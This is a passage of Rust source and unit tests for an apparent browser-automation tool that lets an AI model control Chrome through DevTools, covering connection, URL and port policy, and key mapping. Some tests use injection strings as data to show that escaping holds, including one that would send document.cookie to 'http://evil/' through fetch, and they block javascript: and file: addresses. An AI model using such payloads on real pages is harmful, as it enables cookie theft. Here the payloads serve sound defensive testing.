        let until = Instant::now() + self.grace;
        while Instant::now() < until {
            if let Ok(Some(_)) = child.try_wait() {
                return;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        let _ = child.kill();
        let _ = child.wait();
    }
}

// ------------------------------------------------------------------ connect

/// Parse `ws://host:port/path` into the pieces the handshake needs.
pub fn parse_ws_url(url: &str) -> Option<(String, String)> {
    let rest = url.strip_prefix("ws://")?;
    match rest.split_once('/') {
        Some((hostport, path)) => Some((hostport.to_string(), format!("/{path}"))),
        None => Some((rest.to_string(), "/".to_string())),
    }
}

/// One HTTP/1.1 GET against the debugging port, body returned.
///
/// The body is read by `Content-Length`, not by waiting for EOF. Chrome's
/// DevTools HTTP server holds the socket open after the response even when
/// asked to close it, so reading to EOF just blocks until the timeout and
/// reports a connection failure for a request that actually succeeded.
fn http_get(addr: &str, path: &str) -> std::io::Result<String> {
    use std::io::BufRead;
    use std::net::TcpStream;
    let s = TcpStream::connect(addr)?;
    s.set_read_timeout(Some(Duration::from_secs(10)))?;
    s.set_write_timeout(Some(Duration::from_secs(10)))?;
    // Chrome rejects a Host header it does not recognise as loopback, and
    // applies no Origin check to a client that sends no Origin at all.
    (&s).write_all(format!("GET {path} HTTP/1.1\r\nHost: {addr}\r\nAccept: */*\r\n\r\n").as_bytes())?;
    (&s).flush()?;
    let mut r = std::io::BufReader::new(&s);
    let mut status = String::new();
    r.read_line(&mut status)?;
    if !status.contains(" 200") {
        return Err(other(format!("{addr}{path} answered {}", status.trim())));
    }
    let mut len: Option<usize> = None;
    loop {
        let mut line = String::new();
        if r.read_line(&mut line)? == 0 {
            break;
        }
        let t = line.trim_end();
        if t.is_empty() {
            break;
        }
        if let Some((k, v)) = t.split_once(':')
            && k.trim().eq_ignore_ascii_case("content-length")
        {
            len = v.trim().parse().ok();
        }
    }
    let mut body = Vec::new();
    match len {
        Some(n) => {
            body.resize(n, 0);
            r.read_exact(&mut body)?;
        }
        None => {
            r.read_to_end(&mut body)?;
        }
    }
    Ok(String::from_utf8_lossy(&body).into_owned())
}

impl Cdp<std::net::TcpStream> {
    /// Connect to a browser listening with `--remote-debugging-port`.
    ///
    /// Discovery is HTTP (`/json/list`, `/json/version`) and control is one
    /// WebSocket to the browser endpoint, so every page shares a socket.
    pub fn connect(addr: &str) -> std::io::Result<Self> {
        let targets = parse_targets(&http_get(addr, "/json/list")?);
        let version = http_get(addr, "/json/version")?;
        let url = top_string(&version, "webSocketDebuggerUrl")
            .ok_or_else(|| other(format!("{addr} answered without a webSocketDebuggerUrl: is it a DevTools port?")))?;
        let (hostport, path) = parse_ws_url(&url).ok_or_else(|| other(format!("cannot parse debugger url {url}")))?;
        let sock = std::net::TcpStream::connect(&hostport)?;
        // A wedged renderer must surface as an error, not a hung session.
        sock.set_read_timeout(Some(crate::ws::FRAME_TIMEOUT))?;
        sock.set_write_timeout(Some(Duration::from_secs(10)))?;
        let ws = Ws::handshake(sock, &hostport, &path)?;
        let mut c = Self::new(ws, targets);
        // The ports a page must never be sent to: Syn's console, and this
        // browser's own control port.
        let mut deny = vec![console_port()];
        if let Some(p) = addr.rsplit(':').next().and_then(|p| p.parse::<u16>().ok()) {
            deny.push(p);
        }
        c.set_policy(Policy { deny_ports: deny });
        c.watch_targets();
        Ok(c)
    }
}

/// The port Syn's console listens on: what the console told the CLI it
/// started, else the one it uses unless told otherwise.
pub fn console_port() -> u16 {
    std::env::var("SYN_CONSOLE_PORT").ok().and_then(|p| p.trim().parse().ok()).unwrap_or(7777)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ops::StructArgs;
    use std::cell::RefCell;
    use std::collections::VecDeque;
    use std::rc::Rc;

    // ---- the pure parts ------------------------------------------------

    #[test]
    fn js_string_makes_a_selector_data_not_code() {
        // The whole point: a selector that tries to close the literal and
        // append a statement comes out as one inert string.
        let nasty = "a\");fetch(\"http://evil/\"+document.cookie);//";
        let lit = js_string(nasty);
        assert!(lit.starts_with('"') && lit.ends_with('"'));
        assert_eq!(lit.matches("\\\"").count(), 3, "every quote must be escaped");
        assert!(!lit[1..lit.len() - 1].contains("\";"), "the literal must not terminate early");
        assert_eq!(js_string("a\nb"), "\"a\\nb\"");
        // Legal in JSON, a line break to a JS parser.
        assert_eq!(js_string("a\u{2028}b"), "\"a\\u2028b\"");
    }

    #[test]
    fn top_value_ignores_nesting_and_strings() {
        let j = "{\"id\":7,\"result\":{\"id\":99,\"value\":\"x\"},\"note\":\"has \\\"id\\\":42 inside\"}";
        assert_eq!(top_value(j, "id"), Some("7"));
        assert_eq!(top_value(j, "value"), None, "nested keys are not top level");
        assert_eq!(top_string(j, "note").unwrap(), "has \"id\":42 inside");
        let inner = top_value(j, "result").unwrap();
        assert_eq!(top_value(inner, "id"), Some("99"));
    }

    #[test]
    fn scan_string_decodes_escapes_and_surrogates() {
        let j = "{\"v\":\"tab\\there \\u00e9 \\ud83d\\ude00\"}";
        assert_eq!(top_string(j, "v").unwrap(), "tab\there \u{e9} \u{1f600}");
    }

    fn targets() -> Vec<Target> {
        let t = |id: &str, kind: &str, title: &str, url: &str| Target { id: id.into(), kind: kind.into(), title: title.into(), url: url.into() };
        vec![
            t("SW1", "service_worker", "plan worker", "chrome-extension://x"),
            t("5B3F8A9C1D2E", "page", "plan.md - Visual Studio Code", "vscode-file://x"),
            t("9C0D1E2F3A4B", "page", "Slack | general", "https://app.slack.com/"),
        ]
    }

    #[test]
    fn pick_prefers_a_visible_page_over_a_worker() {
        let t = targets();
        // "plan" matches the service worker first in list order; a human
        // cannot see that target, so the page must win.
        assert_eq!(pick(&t, "plan").unwrap().id, "5B3F8A9C1D2E");
        assert_eq!(pick(&t, "slack").unwrap().id, "9C0D1E2F3A4B");
        assert_eq!(pick(&t, "SW1").unwrap().id, "SW1", "an exact id still resolves");
        assert!(pick(&t, "photoshop").is_none());
    }

    #[test]
    fn a_tab_is_named_from_its_id_so_it_survives_the_page_changing_its_title() {
        assert_eq!(alias_of("5B3F8A9C1D2E"), "tab-5b3f8");
        let mut t = targets();
        assert_eq!(pick(&t, "tab-5b3f8").unwrap().id, "5B3F8A9C1D2E");
        // The page navigates: its title and address are new, its name is not.
        t[1].title = "Quarterly report".into();
        t[1].url = "https://example.com/report".into();
        assert_eq!(pick(&t, "tab-5b3f8").unwrap().id, "5B3F8A9C1D2E");
        assert_eq!(pick(&t, "TAB-5B3F8").unwrap().id, "5B3F8A9C1D2E", "a model may change the case");
    }

    #[test]
    fn the_tab_list_names_each_tab_with_its_title_and_address() {
        let list = tab_list(&targets());
        assert!(list.contains("tab-5b3f8 \"plan.md - Visual Studio Code\" at vscode-file://x"), "{list}");
        assert!(!list.contains("plan worker"), "a worker is not a tab the person could see: {list}");
        assert_eq!(tab_list(&[]), "none");
    }

    #[test]
    fn parse_targets_reads_the_json_list_shape() {
        let body = "[ {\"description\":\"\",\"id\":\"A1\",\"title\":\"Tab \\\"one\\\"\",\"type\":\"page\",\"url\":\"https://a/\"}, \
                     {\"id\":\"B2\",\"title\":\"two\",\"type\":\"iframe\",\"url\":\"https://b/\"} ]";
        let t = parse_targets(body);
        assert_eq!(t.len(), 2);
        assert_eq!(t[0].id, "A1");
        assert_eq!(t[0].title, "Tab \"one\"");
        assert_eq!(t[0].kind, "page");
        assert_eq!(t[1].id, "B2");
    }

    #[test]
    fn parse_ws_url_splits_host_and_path() {
        assert_eq!(parse_ws_url("ws://127.0.0.1:9222/devtools/browser/8f-2a"), Some(("127.0.0.1:9222".into(), "/devtools/browser/8f-2a".into())));
        assert_eq!(parse_ws_url("http://127.0.0.1:9222/x"), None);
    }

    #[test]
    fn split_handle_keeps_colons_in_the_unit() {
        assert_eq!(split_handle("web:tab-5b3f8::doc"), ("web", "tab-5b3f8", ":doc"));
        assert_eq!(split_handle("web:github:a[href^=\"https:\"]"), ("web", "github", "a[href^=\"https:\"]"));
    }

    #[test]
    fn a_page_script_binds_what_it_is_given_as_literals_and_runs_inside_the_unit() {
        let s = page_script("main", "S.read(\"h1\", 0)");
        assert!(s.contains("var u=document.querySelector(\"main\")"), "{}", &s[s.len() - 300..]);
        assert!(s.contains("if(!u)return JSON.stringify({threw:\"unit not found: \"+\"main\"})"));
        assert!(s.contains("S.base=u;"));
        assert!(s.contains("JSON.stringify(S.read(\"h1\", 0))"));
        assert!(s.contains("S.prep = function"), "the script that runs in the page travels with the call");
        // A whole-page unit needs no selector.
        assert!(page_script(":doc", "S.page()").contains("var u=document;"));
        // A unit that tries to close the literal stays a literal.
        let evil = page_script("a\");alert(1);//", "S.page()");
        assert!(evil.contains("document.querySelector(\"a\\\");alert(1);//\")"), "{}", &evil[evil.len() - 300..]);
    }

    #[test]
    fn an_offset_is_only_an_at_sign_and_digits_at_the_very_end() {
        assert_eq!(split_offset("body@4000"), ("body", 4000));
        assert_eq!(split_offset("body"), ("body", 0));
        assert_eq!(split_offset("a[href*=\"@\"]"), ("a[href*=\"@\"]", 0), "an @ inside a selector is part of it");
        assert_eq!(split_offset("a[href$=\"x@12\"]"), ("a[href$=\"x@12\"]", 0));
        assert_eq!(split_offset("@12"), ("@12", 0), "nothing to read an offset of");
        assert_eq!(split_offset("main p@"), ("main p@", 0));
    }

    // ---- addresses -----------------------------------------------------

    fn policy() -> Policy {
        Policy { deny_ports: vec![7777, 41231] }
    }

    #[test]
    fn an_address_is_opened_as_given_or_as_https_when_it_is_only_a_host() {
        let p = policy();
        assert_eq!(check_url("https://example.com/a?b=1#c", &p).unwrap(), "https://example.com/a?b=1#c");
        assert_eq!(check_url("http://example.com", &p).unwrap(), "http://example.com");
        assert_eq!(check_url("example.com/report", &p).unwrap(), "https://example.com/report");
        assert_eq!(check_url("  \"docs.example.org\"  ", &p).unwrap(), "https://docs.example.org");
        assert_eq!(check_url("localhost:3000/app", &p).unwrap(), "http://localhost:3000/app", "a local server has no certificate");
        assert_eq!(check_url("192.168.1.20:8080", &p).unwrap(), "http://192.168.1.20:8080");
        assert_eq!(check_url("about:blank", &p).unwrap(), "about:blank");
    }

    #[test]
    fn only_the_web_is_open_to_a_model_that_chooses_addresses() {
        let p = policy();
        for (url, why) in [
            ("file:///C:/Users/me/secret.txt", "local files are opened with Excel, Word or PowerPoint"),
            ("javascript:alert(1)", "that is code"),
            ("data:text/html,<script>1</script>", "that is code"),
            ("chrome://settings", "the browser's own pages"),
            ("edge://flags", "the browser's own pages"),
            ("view-source:https://example.com", "the browser's own pages"),
            ("ftp://example.com/x", "only http and https"),
            ("https://user:pass@example.com/", "user name or password"),
        ] {
            let e = check_url(url, &p).unwrap_err();
            assert!(e.contains(why), "{url}: {e}");
        }
        assert!(check_url("two words", &p).unwrap_err().contains("not an address"));
        assert!(check_url("", &p).unwrap_err().contains("give an address"));
        assert!(check_url("notahost", &p).unwrap_err().contains("not an address"));
    }

    #[test]
    fn syns_own_console_and_the_browsers_control_port_are_never_a_page() {
        let p = policy();
        for url in ["http://127.0.0.1:7777/", "http://localhost:7777/cmd", "http://[::1]:7777/", "http://127.0.0.1:41231/json/list"] {
            let e = check_url(url, &p).unwrap_err();
            assert!(e.contains("belongs to Syn itself"), "{url}: {e}");
        }
        // Another local server is a page like any other.
        assert!(check_url("http://127.0.0.1:5173/", &p).is_ok());
        assert!(check_url("https://example.com:7777/", &p).is_ok(), "the same number on another host is not Syn's");
    }

    #[test]
    fn what_reads_as_an_address_and_what_as_a_title() {
        assert!(has_scheme("https://x.y") && has_scheme("HTTP://X") && has_scheme("file:///x") && has_scheme("javascript:1"));
        assert!(!has_scheme("example.com") && !has_scheme("Quarterly report: draft"));
        assert!(host_like("example.com") && host_like("docs.example.org/a?b") && host_like("localhost:3000"));
        assert!(!host_like("Contact form") && !host_like("example") && !host_like("tab-5b3f8") && !host_like(""));
    }

    // ---- keys ----------------------------------------------------------

    #[test]
    fn keys_are_named_the_way_a_person_names_them() {
        let (m, k) = parse_key("Enter").unwrap();
        assert_eq!((m, k.key.as_str(), k.vk, k.text.as_deref()), (0, "Enter", 13, Some("\r")));
        let (m, k) = parse_key("control+a").unwrap();
        assert_eq!((m, k.code.as_str(), k.vk), (MOD_CTRL, "KeyA", 65));
        assert_eq!(k.text, None, "a shortcut selects, it does not type an a");
        let (m, k) = parse_key("Shift+Tab").unwrap();
        assert_eq!((m, k.key.as_str(), k.text), (MOD_SHIFT, "Tab", None));
        let (m, k) = parse_key("Ctrl+Shift+ArrowDown").unwrap();
        assert_eq!((m, k.key.as_str()), (MOD_CTRL | MOD_SHIFT, "ArrowDown"));
        assert_eq!(parse_key("F5").unwrap().1.vk, 116);
        assert_eq!(parse_key("esc").unwrap().1.key, "Escape");
        assert_eq!(parse_key("PgDn").unwrap().1.key, "PageDown");
        assert_eq!(parse_key("Space").unwrap().1.text.as_deref(), Some(" "));
        assert_eq!(parse_key("7").unwrap().1.code, "Digit7");
        let (_, k) = parse_key("Shift+q").unwrap();
        assert_eq!((k.key.as_str(), k.text.as_deref()), ("Q", Some("Q")));
        // The plus key is Shift and the equals key, as on a keyboard.
        assert_eq!(parse_key("+").unwrap(), (MOD_SHIFT, Key { key: "+".into(), code: "Equal".into(), vk: 187, text: Some("+".into()) }));
        assert_eq!(parse_key("Control++").unwrap(), (MOD_CTRL | MOD_SHIFT, Key { key: "+".into(), code: "Equal".into(), vk: 187, text: None }));
        assert_eq!(parse_key(".").unwrap().1.vk, 190, "the period key, not Delete");
    }

    #[test]
    fn every_printable_character_is_the_key_a_keyboard_types_it_with_and_none_is_a_navigation_key() {
        // The bug this holds: a dot typed into an address was sent as virtual
        // key 46, which is Delete, and `ada@example.test` arrived as
        // `ada@exampletest`.
        let navigation = [8, 9, 13, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46];
        for c in ' '..='~' {
            let (mods, k) = char_key(c).unwrap_or_else(|| panic!("{c:?} has no key"));
            assert!(!navigation.contains(&k.vk), "{c:?} would be sent as the navigation key {}", k.vk);
            assert_eq!(k.text.as_deref(), Some(c.to_string().as_str()), "{c:?} types itself");
            assert_eq!(k.key, c.to_string());
            assert!(mods == 0 || mods == MOD_SHIFT);
        }
        assert_eq!(char_key('.').map(|(m, k)| (m, k.code, k.vk)), Some((0, "Period".into(), 190)));
        assert_eq!(char_key('@').map(|(m, k)| (m, k.code, k.vk)), Some((MOD_SHIFT, "Digit2".into(), 50)));
        assert_eq!(char_key('?').map(|(m, k)| (m, k.code, k.vk)), Some((MOD_SHIFT, "Slash".into(), 191)));
        assert_eq!(char_key('-').map(|(m, k)| (m, k.vk)), Some((0, 189)));
        assert_eq!(char_key('_').map(|(m, k)| (m, k.vk)), Some((MOD_SHIFT, 189)));
        assert_eq!(char_key('Q').map(|(m, k)| (m, k.code)), Some((MOD_SHIFT, "KeyQ".into())));
        assert_eq!(char_key('\u{e9}'), None, "an accent is inserted whole, not pressed");
    }

    #[test]
    fn a_key_that_is_not_one_is_refused_with_the_ones_that_are() {
        let e = parse_key("Wiggle").unwrap_err();
        assert!(e.contains("not a key I know") && e.contains("Enter, Tab, Escape"), "{e}");
        let e = parse_key("Hyper+a").unwrap_err();
        assert!(e.contains("not a modifier") && e.contains("Control, Shift, Alt or Meta"), "{e}");
        assert!(parse_key("").unwrap_err().contains("say which key"));
        assert!(parse_key("F13").is_err());
    }

    // ---- what this hand does at all -----------------------------------

    fn office(verb: &str, args: &[(&str, &str)]) -> Call {
        Call::Struct(StructArgs::Office { verb: verb.into(), args: args.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(), payload: String::new() })
    }

    #[test]
    fn the_calls_a_page_cannot_honour_are_refused_before_a_browser_is_asked() {
        assert!(supported(&Call::Undo).unwrap_err().contains("no undo"));
        assert!(supported(&office("sort", &[])).unwrap_err().contains("not something a web page has"));
        let e = supported(&Call::Struct(StructArgs::AddSheet { name: "S".into() })).unwrap_err();
        assert!(e.contains("goto, type, press"), "say what a page takes: {e}");
        let export = |f: &str, p: Option<&str>| Call::Export(ExportArgs { format: f.into(), path: p.map(str::to_string), sheet: None });
        assert!(supported(&export("png", Some("a.png"))).is_ok() && supported(&export("pdf", Some("a.pdf"))).is_ok());
        assert!(supported(&export("text", None)).is_ok() && supported(&export("title", None)).is_ok());
        assert!(supported(&export("png", None)).unwrap_err().contains("needs a path"));
        assert!(supported(&export("html", Some("o.html"))).unwrap_err().contains("only png and pdf"));
        assert!(supported(&export("xlsx", Some("o.xlsx"))).unwrap_err().contains("not supported"));
        let invoke = |a: &str| Call::Struct(StructArgs::Invoke { selector: "#go".into(), action: a.into() });
        for ok in ["invoke", "click", "toggle", "select", "focus"] {
            assert!(supported(&invoke(ok)).is_ok(), "{ok}");
        }
        // A browser has no expand/collapse: refuse rather than click and
        // claim the node expanded.
        assert!(supported(&invoke("expand")).unwrap_err().contains("not an action on a web page"));
    }

    #[test]
    fn the_verbs_this_hand_answers_are_the_verbs_the_surface_offers_a_page() {
        // One list in the hand, one table in the tool surface, one row in
        // the per-app table: they drift apart quietly, and a verb offered
        // that the hand refuses (or the reverse) is found on someone's desk.
        let mut surface: Vec<&str> = crate::tools::WEB_VERBS.iter().map(|v| v.name).collect();
        surface.extend(["find", "close"]);
        surface.sort();
        let mut hand: Vec<&str> = VERBS.to_vec();
        hand.sort();
        assert_eq!(surface, hand);
        let (_, row) = crate::tools::APP_METHODS.iter().find(|(a, _)| *a == "web").expect("web has a row");
        let mut row: Vec<&str> = row.iter().copied().filter(|m| !["read", "write", "format", "export", "invoke"].contains(m)).collect();
        row.sort();
        assert_eq!(row, hand);
    }

    // ---- a scripted browser --------------------------------------------

    /// What the fake browser holds and has been told.
    struct State {
        inbound: VecDeque<u8>,
        log: Vec<(String, String, Option<String>)>,
        closed: bool,
    }

    /// Given (id, method, params, session), the messages to send back, in
    /// order: replies and events alike.
    type Answer = Box<dyn FnMut(u64, &str, &str, Option<&str>) -> Vec<String>>;

    /// A browser on the other end of the socket. Silent unless it has been
    /// told something; a read with nothing to read times out the way a
    /// socket's does, so no test hangs on a reply that was never scripted.
    #[derive(Clone)]
    struct Browser {
        st: Rc<RefCell<State>>,
        answer: Rc<RefCell<Answer>>,
    }

    impl std::fmt::Debug for Browser {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            write!(f, "Browser")
        }
    }

    fn server_frame(s: &str) -> Vec<u8> {
        let b = s.as_bytes();
        let mut out = vec![0x81];
        if b.len() < 126 {
            out.push(b.len() as u8);
        } else if b.len() <= u16::MAX as usize {
            out.push(126);
            out.extend_from_slice(&(b.len() as u16).to_be_bytes());
        } else {
            out.push(127);
            out.extend_from_slice(&(b.len() as u64).to_be_bytes());
        }
        out.extend_from_slice(b);
        out
    }

    impl Read for Browser {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            let mut st = self.st.borrow_mut();
            if st.inbound.is_empty() {
                return if st.closed { Ok(0) } else { Err(std::io::Error::from(std::io::ErrorKind::TimedOut)) };
            }
            let n = buf.len().min(st.inbound.len());
            for slot in buf.iter_mut().take(n) {
                *slot = st.inbound.pop_front().unwrap();
            }
            Ok(n)
        }
    }

    impl Write for Browser {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            // Unmask every client frame back into text, as a server does.
            let mut i = 0;
            while i + 2 <= buf.len() {
                let l7 = (buf[i + 1] & 0x7F) as usize;
                let (len, mut j) = if l7 == 126 { (u16::from_be_bytes([buf[i + 2], buf[i + 3]]) as usize, i + 4) } else { (l7, i + 2) };
                let mask = [buf[j], buf[j + 1], buf[j + 2], buf[j + 3]];
                j += 4;
                let text: Vec<u8> = buf[j..j + len].iter().enumerate().map(|(k, x)| x ^ mask[k % 4]).collect();
                i = j + len;
                let text = String::from_utf8_lossy(&text).into_owned();
                let id = top_value(&text, "id").and_then(|v| v.trim().parse::<u64>().ok()).unwrap_or(0);
                let method = top_string(&text, "method").unwrap_or_default();
                let params = top_value(&text, "params").unwrap_or("{}").to_string();
                let session = top_string(&text, "sessionId");
                self.st.borrow_mut().log.push((method.clone(), params.clone(), session.clone()));
                let out = (self.answer.borrow_mut())(id, &method, &params, session.as_deref());
                let mut st = self.st.borrow_mut();
                for m in out {
                    st.inbound.extend(server_frame(&m));
                }
            }
            Ok(buf.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }

    impl Deadline for Browser {
        fn set_read_deadline(&self, _: Option<Duration>) -> std::io::Result<()> {
            Ok(())
        }
    }

    fn reply(id: u64, result: &str) -> String {
        format!("{{\"id\":{id},\"result\":{result}}}")
    }

    /// What `Runtime.evaluate` answers when a script returned `json`.
    fn evaluated(id: u64, json: &str) -> String {
        reply(id, &format!("{{\"result\":{{\"type\":\"string\",\"value\":{}}}}}", js_string(json)))
    }

    fn event(method: &str, params: &str, session: Option<&str>) -> String {
        match session {
            Some(s) => format!("{{\"method\":\"{method}\",\"params\":{params},\"sessionId\":\"{s}\"}}"),
            None => format!("{{\"method\":\"{method}\",\"params\":{params}}}"),
        }
    }

    /// The call a page script ends with: `S.prep("#go", "click")`.
    fn expr_of(params: &str) -> String {
        let script = top_string(params, "expression").unwrap_or_default();
        let from = script.rfind("try{return JSON.stringify(").map(|i| i + "try{return JSON.stringify(".len()).unwrap_or(0);
        let rest = &script[from..];
        rest[..rest.find(");}catch(e)").unwrap_or(rest.len())].to_string()
    }

    fn info(id: &str, title: &str, url: &str) -> String {
        format!("{{\"targetId\":\"{id}\",\"type\":\"page\",\"title\":{},\"url\":{}}}", js_string(title), js_string(url))
    }

    /// A browser with these tabs that answers the plumbing (attach, enable,
    /// input, listing) itself and leaves the page's own answers to `pages`:
    /// a script whose call starts with the first string gets the second.
    fn answering(tabs: Vec<(&'static str, &'static str, &'static str)>, pages: Vec<(&'static str, &'static str)>) -> Answer {
        Box::new(move |id, method, params, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Target.getTargets" => {
                let infos: Vec<String> = tabs.iter().map(|(i, t, u)| info(i, t, u)).collect();
                vec![reply(id, &format!("{{\"targetInfos\":[{}]}}", infos.join(",")))]
            }
            "Target.createTarget" => vec![reply(id, "{\"targetId\":\"NEWTAB000111\"}")],
            "Page.navigate" => vec![reply(id, "{\"frameId\":\"F1\",\"loaderId\":\"L1\"}")],
            "Runtime.evaluate" => {
                let e = expr_of(params);
                match pages.iter().find(|(prefix, _)| e.starts_with(prefix)) {
                    Some((_, json)) => vec![evaluated(id, json)],
                    None => panic!("no scripted answer for the page call {e}"),
                }
            }
            _ => vec![reply(id, "{}")],
        })
    }

    fn cdp_with(answer: Answer, seen: Vec<Target>) -> (Cdp<Browser>, Rc<RefCell<State>>) {
        let st = Rc::new(RefCell::new(State { inbound: VecDeque::new(), log: Vec::new(), closed: false }));
        let b = Browser { st: Rc::clone(&st), answer: Rc::new(RefCell::new(answer)) };
        let mut c = Cdp::new(Ws::from_upgraded(b), seen);
        c.set_policy(policy());
        (c, st)
    }

    fn the_tab() -> Target {
        Target { id: "5B3F8A9C1D2E".into(), kind: "page".into(), title: "Contact form".into(), url: "http://x/form".into() }
    }

    fn one_tab(pages: Vec<(&'static str, &'static str)>) -> (Cdp<Browser>, Rc<RefCell<State>>) {
        cdp_with(answering(vec![("5B3F8A9C1D2E", "Contact form", "http://x/form")], pages), vec![the_tab()])
    }

    const H: &str = "web:tab-5b3f8::doc";

    fn methods(st: &Rc<RefCell<State>>) -> Vec<String> {
        st.borrow().log.iter().map(|(m, _, _)| m.clone()).collect()
    }

    fn read(sel: &str) -> Call {
        Call::Read(ReadArgs { selector: sel.into() })
    }

    // ---- reading, and the plumbing under it -----------------------------

    #[test]
    fn a_read_attaches_once_enables_the_page_then_runs_the_script() {
        let (mut c, st) = one_tab(vec![("S.read(", "{\"ok\":true,\"text\":\"Hello page\",\"total\":10,\"off\":0,\"n\":1}")]);
        let r = c.dispatch_call(&read("h1"), H).unwrap();
        assert!(r.ok, "{}", r.error);
        assert_eq!(r.preview, "Hello page");
        assert_eq!(methods(&st), ["Target.attachToTarget", "Page.enable", "Target.activateTarget", "Runtime.evaluate"]);
        let log = st.borrow().log.clone();
        assert!(log[0].1.contains("\"targetId\":\"5B3F8A9C1D2E\"") && log[0].1.contains("\"flatten\":true"), "resolved by its name");
        assert_eq!(log[1].2.as_deref(), Some("S1"), "dialogs and loading are reported to a page that asked");
        assert!(log[2].1.contains("5B3F8A9C1D2E"), "the tab is brought to the front before it is driven");
        assert!(log[3].1.contains("S.read(\\\"h1\\\", 0)"), "the selector is bound as a literal: {}", &log[3].1[log[3].1.len().saturating_sub(200)..]);
    }

    #[test]
    fn a_second_op_reuses_the_session() {
        let (mut c, st) = one_tab(vec![("S.read(", "{\"ok\":true,\"text\":\"t\",\"total\":1,\"off\":0,\"n\":1}")]);
        c.dispatch_call(&read("h1"), H).unwrap();
        c.dispatch_call(&read("h2"), H).unwrap();
        assert_eq!(methods(&st).iter().filter(|m| *m == "Target.attachToTarget").count(), 1);
        assert_eq!(methods(&st).iter().filter(|m| *m == "Page.enable").count(), 1);
    }

    #[test]
    fn a_tab_is_brought_to_the_front_once_and_again_after_another_tab_has_appeared() {
        // A tab Chrome is not showing runs at a crawl, and a link that opens
        // a tab puts that tab in front: the page Syn went on driving stopped
        // loading what waits to be scrolled into view.
        let (mut c, st) = one_tab(vec![("S.read(", "{\"ok\":true,\"text\":\"t\",\"total\":1,\"off\":0,\"n\":1}")]);
        let activations = |st: &Rc<RefCell<State>>| methods(st).iter().filter(|m| *m == "Target.activateTarget").count();
        c.dispatch_call(&read("h1"), H).unwrap();
        c.dispatch_call(&read("h2"), H).unwrap();
        assert_eq!(activations(&st), 1, "in front already: no second call, no second raising of the window");
        c.on_event(&event("Target.targetCreated", "{\"targetInfo\":{\"targetId\":\"AAAA1111BBBB\",\"type\":\"page\",\"url\":\"http://x/\",\"openerId\":\"5B3F8A9C1D2E\"}}", None));
        c.dispatch_call(&read("h3"), H).unwrap();
        assert_eq!(activations(&st), 2, "a new tab took the front: this one is brought back");
        let sent = st.borrow().log.iter().filter(|(m, _, _)| m == "Target.activateTarget").map(|(_, p, _)| p.clone()).collect::<Vec<_>>();
        assert!(sent[1].contains("5B3F8A9C1D2E"), "{sent:?}");
    }

    #[test]
    fn a_long_read_says_how_to_read_on() {
        let (mut c, _) = one_tab(vec![("S.read(", "{\"ok\":true,\"text\":\"abcd\",\"total\":9000,\"off\":0,\"n\":1}")]);
        let r = c.dispatch_call(&read("body"), H).unwrap();
        assert!(r.preview.starts_with("abcd\n[characters 0 to 4 of 9000."), "{}", r.preview);
        assert!(r.preview.contains("read selector \"body@4\""), "{}", r.preview);
        // The offset is passed through to the page.
        let (mut c, st) = one_tab(vec![("S.read(", "{\"ok\":true,\"text\":\"x\",\"total\":4001,\"off\":4000,\"n\":1}")]);
        c.dispatch_call(&read("body@4000"), H).unwrap();
        assert!(st.borrow().log.last().unwrap().1.contains("S.read(\\\"body\\\", 4000)"));
    }

    #[test]
    fn what_is_hidden_is_said_to_be_hidden_and_not_read() {
        let (mut c, _) = one_tab(vec![("S.read(", "{\"ok\":true,\"text\":\"\",\"total\":0,\"off\":0,\"n\":1,\"hidden\":\"div#secret\"}")]);
        let r = c.dispatch_call(&read("#secret"), H).unwrap();
        assert!(r.ok && r.preview.contains("div#secret is not visible"), "{}", r.preview);
    }

    #[test]
    fn the_map_is_a_read_of_its_own() {
        let (mut c, st) = one_tab(vec![("S.map(", "{\"ok\":true,\"text\":\"PAGE \\\"x\\\"\\nFIELDS\\n  textbox #a\"}")]);
        let r = c.dispatch_call(&read(":map"), H).unwrap();
        assert!(r.ok && r.preview.starts_with("PAGE \"x\"\nFIELDS"), "{}", r.preview);
        assert!(st.borrow().log.last().unwrap().1.contains("S.map(3600)"));
    }

    #[test]
    fn events_between_replies_are_skipped_by_id() {
        let ans: Answer = Box::new(|id, method, _, _| match method {
            "Target.attachToTarget" => vec![
                event("Target.targetCreated", "{\"targetInfo\":{\"targetId\":\"zz\",\"type\":\"other\"}}", None),
                reply(id, "{\"sessionId\":\"S1\"}"),
            ],
            "Runtime.evaluate" => vec![
                event("Runtime.consoleAPICalled", "{\"args\":[{\"value\":\"id:99\"}]}", Some("S1")),
                evaluated(id, "{\"ok\":true,\"text\":\"right one\",\"total\":9,\"off\":0,\"n\":1}"),
            ],
            _ => vec![reply(id, "{}")],
        });
        let (mut c, _) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&read("h1"), H).unwrap();
        assert_eq!(r.preview, "right one", "a console log that mentions an id must not be mistaken for the reply");
    }

    #[test]
    fn a_thrown_script_is_an_error_reply_not_a_success() {
        let (mut c, _) = one_tab(vec![("S.read(", "{\"threw\":\"no element matches #gone\"}")]);
        let r = c.dispatch_call(&read("#gone"), H).unwrap();
        assert!(!r.ok && r.error.contains("no element matches #gone"), "{}", r.error);
    }

    #[test]
    fn a_script_that_could_not_even_run_is_an_error_reply_too() {
        let ans: Answer = Box::new(|id, method, _, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Runtime.evaluate" => vec![reply(id, "{\"result\":{\"type\":\"object\"},\"exceptionDetails\":{\"text\":\"Uncaught\",\"exception\":{\"description\":\"SyntaxError: nope\"}}}")],
            _ => vec![reply(id, "{}")],
        });
        let (mut c, _) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&read("h1"), H).unwrap();
        assert!(!r.ok && r.error.contains("SyntaxError: nope"), "{}", r.error);
    }

    #[test]
    fn a_script_that_lands_in_a_page_being_replaced_is_run_again_once() {
        let mut seen = 0;
        let ans: Answer = Box::new(move |id, method, _, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Runtime.evaluate" => {
                seen += 1;
